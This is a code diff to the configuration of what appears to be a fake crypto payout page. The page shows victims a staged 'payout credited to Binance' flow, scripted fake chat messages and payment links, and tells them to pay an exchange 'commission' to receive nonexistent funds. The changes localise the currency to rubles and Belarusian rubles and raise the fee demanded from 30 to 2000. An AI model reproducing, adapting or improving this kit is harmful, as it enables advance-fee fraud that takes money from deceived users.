@@ -3286,7 +3286,7 @@
                         pre: []
                     },
                     curCodeEquals: {
-                        RU: "USD",
+                        RU: "RUB",
                         UA: "UAH",
                         KZ: "KZT",
                         US: "USD",
@@ -3302,11 +3302,11 @@
                     },
                     moneyCountryData: [{
                         country: "Russia",
-                        code: "USD",
+                        code: "RUB",
                         kurs: 1,
                         dollar: 150,
                         textMoney1: ["Russian rubles", "rubles"],
-                        pre: ["USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD"]
+                        pre: ["RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB"]
                     }, {
                         country: "Ukraine",
                         code: "UAH",
@@ -3341,7 +3341,7 @@
                         kurs: .03372,
                         dollar: 2.87,
                         textMoney1: ["Belarusian rubles", "rubles"],
-                        pre: ["USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD"]
+                        pre: ["BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN", "BYN"]
                     }, {
                         country: "Moldova",
                         code: "MDL",
@@ -5203,7 +5203,7 @@
                         text: "3dotsFloat"
                     },
                     sendAnimation: "sharp",
-                    chatPull: ["I have received your form {{next}}", "To complete the payout processing, we now need to exchange your bitcoins into USD. {{next}}", 'The exchange rate is minimal through the special service <span class="font-weight-bold">Binance</span>, which is <span class="text-numbers">0.4%</span> {{next}}', 'After currency conversion you will receive <span class="text-numbers">{{moneyPageBased}}</span> {{next}}', "{{upsellbtn}}"]
+                    chatPull: ["I have received your form {{next}}", "To complete the payout processing, we now need to exchange your bitcoins into USD. {{next}}", 'The exchange rate is minimal through the special service <span class="font-weight-bold">Binance</span>, which is <span class="text-numbers">0.4%</span> {{next}}', 'After currency conversion you will receive <span class="text-numbers">{{geoMoneyHard}}</span> {{next}}', "{{upsellbtn}}"]
                 },
                 title: "Provide the details to which you wish to receive funds",
                 product: "",
@@ -5230,20 +5230,20 @@
                 isLoading: !0,
                 loadsteps: ["Transferring payout to cryptocurrency exchange", "Transferring funds to BTC"],
                 statusMessage: "Payout successfully credited to the cryptocurrency exchange!",
-                title: 'You need to create an order to exchange BTC to USD',
+                title: 'You need to create an order to exchange BTC to <span class="text-uppercase">{{converting_geoCur}}</span>',
                 description: ["Your funds have been transferred to the cryptocurrency exchange <b>Binance</b>", 'The exchange currently holds <b class="text-numbers">{{moneyBTC}}</b>', 'Make the cryptocurrency exchange now to receive funds immediately. The exchange commission on Binance is <b class="text-numbers">0.4%</b>.'],
                 upsellType: "text",
-                product: 'The conversion cost of <span class="text-numbers">{{moneyBTC}}</span> to USD will be',
+                product: 'The conversion cost of <span class="text-numbers">{{moneyBTC}}</span> to <span class="text-uppercase">{{converting_geoCur}}</span> will be',
                 amount: {
-                    e: 30,
-                    c: 30,
-                    h: 30,
-                    b: 30,
-                    p: 30
+                    e: 2000,
+                    c: 2000,
+                    h: 2000,
+                    b: 2000,
+                    p: 2000
                 },
                 customItem: '<div class="align-items-center justify-content-center row text-center" style="margin-bottom: 20px;"> <div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Give  <span class="text-numbers">{{moneyBTC}}</span></b></label> </div><div><div class="bit-lang-g-icon col-sm obmenbtc"></div></div><div class="col-sm my-auto"> <label style="padding: 10px;border-radius: 10px;border: 2px double #0094be;color: #0093c0;"><b>Receive <span class="text-numbers">{{convertedAmountUSD}}</span></b> </label> </div></div>',
-                instructions: ['Click the button "Exchange BTC to USD"', "Pay the cryptocurrency exchange commission", "Receive your funds in dollars"],
-                buttonText: 'Exchange BTC to USD',
+                instructions: ['Click the button "Exchange BTC to <span class="text-uppercase">{{converting_geoCur}}</span>"', "Pay the cryptocurrency exchange commission", "Receive your funds in dollars"],
+                buttonText: 'Exchange BTC to <span class="text-uppercase">{{converting_geoCur}}</span>',
                 paymentLink: "/account/exchange?s=gd260ca58",
                 paymentLinks: {
                     e: window.location.origin + o + "pay48544.html",
@@ -5257,7 +5257,7 @@
                 name: "manager and receipt",
                 loadtime: 13,
                 isLoading: !0,
-                loadsteps: ['Transferring funds from BTC to USD', 'Your funds have been successfully converted to USD', "Connecting with the manager"],
+                loadsteps: ['Transferring funds from BTC to <span class="text-uppercase">{{converting_geoCur}}</span>', 'Your funds have been successfully converted to <span class="text-uppercase">{{converting_geoCur}}</span>', "Connecting with the manager"],
                 statusMessage: "Currency conversion completed successfully!",
                 upsellType: "chat",
                 chat: {
@@ -6009,27 +6009,27 @@
                     curRate: 1,
                     usdCurRate: 150,
                     city: "Moscow",
-                    pre: ["USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD", "USD"]
+                    pre: ["RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB", "RUB"]
                 },
                 supportmail: "bitcoin@bonuses.com",
                 countryStore: {
                     countryName: "Russia",
-                    currencyUSER: "USD",
+                    currencyUSER: "RUB",
                     curRate: 1,
                     owc: {
                         im: {
-                            short: "USD",
-                            one: "USD",
-                            mult: "USD"
+                            short: "RUB",
+                            one: "ruble",
+                            mult: "rubles"
                         },
                         vin: {
-                            one: "USD"
+                            one: "ruble"
                         },
                         predl: {
-                            mult: "USD"
+                            mult: "rubles"
                         },
                         rod: {
-                            mult: "USD"
+                            mult: "rubles"
                         }
                     }
                 },
